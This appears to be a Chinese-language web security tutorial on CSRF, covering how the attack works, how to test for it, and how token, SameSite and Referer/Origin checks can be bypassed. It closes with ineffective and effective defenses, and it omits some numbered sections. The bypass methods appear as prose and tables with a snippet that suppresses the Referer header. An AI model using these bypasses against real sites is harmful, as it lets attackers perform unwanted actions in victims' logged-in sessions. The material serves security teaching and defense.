CSRF 跨站请求伪造

2026-06-28 WEB渗透 ， 基础漏洞

一、基本原理

1.1 是什么

CSRF（Cross-Site Request Forgery，跨站请求伪造），也叫 One Click Attack 或 Session Riding。一句话：攻击者诱导受害者访问恶意页面，浏览器以受害者的身份向目标网站发了一个请求，干了受害者不想干的事。

和 XSS 的本质区别：

CSRF XSS
攻击方式 借用户的权限发起请求，攻击者自己没拿到权限 直接盗取用户的权限或 Cookie
脚本注入 不需要往目标站注入 JS 需要把恶意脚本注入目标站页面
攻击者能看到响应 ❌ 看不到 ✅ 能通过 JS 读取

打个比方：XSS 是偷了你的钥匙进你家门；CSRF 是骗你自己开门——攻击者根本不需要知道钥匙长什么样。

1.2 攻击前提

两个条件缺一不可：

  1. 受害者已登录目标网站，session 未过期
  2. 受害者访问了攻击者构造的恶意页面或链接

1.3 黑盒如何判断

抓包看三个东西：

  1. 有没有验证请求来源（Referer / Origin / Sec-Fetch-Site）
  2. 有没有 CSRF Token
  3. 关键操作有没有二次验证（密码、验证码）

三、CSRF Token 绕过

Token 是最主流的 CSRF 防护，但实现不好形同虚设：

绕过手法 原理
直接删掉 Token 服务端只在 Token 存在时校验，删了跳过
全局 Token 复用 全站共用一个 Token，用自己账号的 Token 打受害者
Token 未绑定 Session 换个 Cookie，Token 还能用，用户间可互换
Cookie Tossing（Cookie 投毒） 从同站子域名设一个同名 CSRF Cookie，覆盖受害者的
CORS 泄露 CORS 配错 → 跨域 JS 读到页面里的 Token
Token 不过期 生成后永不刷新，拿到一次用一辈子

四、SameSite Cookie 绕过

SameSite 是浏览器从 Chrome 80+ 开始强推的 CSRF 防护，控制 Cookie 在跨站请求中是否发送：

属性 跨站请求是否携带 Cookie
None ✅ 始终携带（必须配 Secure）
Lax（Chrome 默认） 仅 GET + 顶级导航；POST / iframe / img / script 不携带
Strict ❌ 完全不携带

4.1 None — 直接打

Cookie 被显式标为 SameSite=None; Secure，开发者主动关掉了防护。传统 CSRF 怎么打就怎么打。

4.2 Lax 绕过

手法一：GET 方法重载

Symfony、Laravel 等框架支持 _method 参数覆写 HTTP 方法——GET 到后端变 POST，绕过 Lax 对 POST 的限制。

手法二：Cookie 刷新攻击（120 秒窗口）

4.3 Strict 绕过

Strict 是最强的，但”同站”定义有隙可乘：

手法一：子域名漏洞链

子域名只要有一个能执行 JS 的点，Strict 就没用了。

手法二：客户端重定向 Gadget

利用目标站内的 DOM-based redirect 做跳板——请求从站内 JS 发起，Strict Cookie 自然被携带。

手法三：User-Agent 差异

桌面版 Strict，移动版 None——诱导受害者用手机打开恶意页面即可绕过。

五、Referer / Origin 校验绕过

绕过方式 原理
删除 Referer <meta name="referrer" content="never"> 让浏览器不发 Referer，服务端看到空值直接放行
宽松匹配 服务端只检查 Referer 是否”包含”目标域名 → evil.com/target.com 通过
Origin: null sandbox iframe / data: URL / 跨源重定向链产生 null Origin，服务端没区分
子域名伪造 在子域名部署同名 Referer 检查的支持页面

八、防御

无效防御（别踩坑）

误区 原因
仅接受 POST 攻击者能构造自动提交的表单
多步操作 攻击者可逐步预测和自动填充
HTTPS 传输层加密，跟 CSRF 无关
URL 重写 Session Session 暴露在 URL 里，故障比 CSRF 还大
私密 Cookie 名 Cookie 是浏览器自动发的，字段名不重要

有效防御

措施 要点
CSRF Token 随机、绑定 Session、一次性、不在 Cookie 里存
SameSite Cookie Strict 或 Lax，浏览器层面拦截跨站 Cookie
验证 Origin + Referer 严格比对 + 缺失时直接拒绝，不做模糊匹配
二次验证 关键操作强制输入密码或验证码
HttpOnly 禁止 JS 读 Cookie，切断 XSS → CSRF 链
Sec-Fetch-Site 现代浏览器默认带这个头，cross-site 直接拦截
